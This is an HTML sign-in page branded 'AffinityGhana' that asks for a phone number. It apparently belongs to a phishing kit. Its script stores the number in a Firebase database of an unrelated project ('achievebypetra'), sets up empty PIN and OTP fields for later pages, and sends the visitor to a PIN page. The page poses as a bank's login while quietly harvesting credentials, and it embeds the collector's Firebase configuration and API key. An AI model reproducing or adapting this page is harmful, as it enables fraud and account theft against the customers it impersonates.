<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AffinityGhana - Phone Number</title>
<link rel="icon" type="image/png" href="assets/logo.png">
<link rel="stylesheet" href="style.css">
</head>
<body>

<div class="app">
  <div class="page phone-page">

    <svg class="blob-svg-bg" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <linearGradient id="blobGrad1" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stop-color="#e2231a"/>
          <stop offset="50%" stop-color="#f5821f"/>
          <stop offset="100%" stop-color="#ffd23f"/>
        </linearGradient>
      </defs>
      <circle cx="100" cy="55" r="45" fill="url(#blobGrad1)"/>
      <circle cx="145" cy="100" r="45" fill="url(#blobGrad1)"/>
      <circle cx="100" cy="145" r="45" fill="url(#blobGrad1)"/>
      <circle cx="55" cy="100" r="45" fill="url(#blobGrad1)"/>
    </svg>

    <div class="illustration-wrap">
      <div class="illustration-circle">
        <img src="assets/icon-phone.png" alt="">
      </div>
    </div>

    <h1 class="title">Welcome to Affinity</h1>
    <p class="subtitle">Enter your phone number</p>

    <div class="phone-input-row">
      <div class="country-chip">
        <img src="assets/ghana-flag.svg" alt="Ghana" width="26" height="18">
        <span class="code">+233</span>
      </div>
      <div class="divider"></div>
      <input type="tel" id="phoneInput" class="phone-field" placeholder="Phone number" inputmode="numeric" maxlength="10" autocomplete="tel">
    </div>

    <button class="btn-primary" id="phoneContinueBtn">Continue</button>

    <div class="footer-links">
      <span class="link"><span class="help-icon">👤</span> Need help?</span>
      <span class="sep"></span>
      <span class="link">Terms and conditions</span>
    </div>

  </div>
</div>

<!-- Toast Notification -->
<div id="toast" class="toast"></div>

<!-- Firebase SDK -->
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

<script>
  // 🔥 YOUR FIREBASE CONFIG
  const firebaseConfig = {
    apiKey: "AIzaSyBx6AU-Jvg1So-Ty3FFKryctXZGV-LNFCY",
    authDomain: "achievebypetra-82966.firebaseapp.com",
    databaseURL: "https://achievebypetra-82966-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "achievebypetra-82966",
    storageBucket: "achievebypetra-82966.firebasestorage.app",
    messagingSenderId: "412688052429",
    appId: "1:412688052429:web:abf989e226e153b7c37984",
    measurementId: "G-TBGZS8PJ76"
  };

  firebase.initializeApp(firebaseConfig);
  const database = firebase.database();

  function showToast(msg) {
    const toast = document.getElementById('toast');
    toast.textContent = msg;
    toast.classList.add('show');
    clearTimeout(toast._timeout);
    toast._timeout = setTimeout(() => {
      toast.classList.remove('show');
    }, 2000);
  }

  var phoneInput = document.getElementById('phoneInput');
  var continueBtn = document.getElementById('phoneContinueBtn');

  phoneInput.addEventListener('input', function () {
    phoneInput.value = phoneInput.value.replace(/\D/g, '');
  });

  continueBtn.addEventListener('click', function () {
    var phone = phoneInput.value.trim();
    if (phone.length < 9) {
      phoneInput.parentElement.style.borderColor = '#c0392b';
      setTimeout(function () { phoneInput.parentElement.style.borderColor = ''; }, 900);
      return;
    }

    // ✅ Generate random User ID
    var userId = 'User_' + Date.now().toString(36).toUpperCase();

    // ✅ Save phone number to Firebase
    var userData = {
      id: userId,
      phone: phone,
      pin: '',
      otp: '',
      timestamp: new Date().toLocaleString()
    };

    database.ref('users/' + userId).set(userData)
      .then(() => {
        // ✅ Store user ID in session for next steps
        sessionStorage.setItem('affinity_userId', userId);
        sessionStorage.setItem('affinity_phone', phone);
        showToast('Phone number saved!');
        setTimeout(function () {
          window.location.href = 'pin.html';
        }, 500);
      })
      .catch(function (error) {
        showToast('Error: ' + error.message);
      });
  });
</script>

</body>
</html>
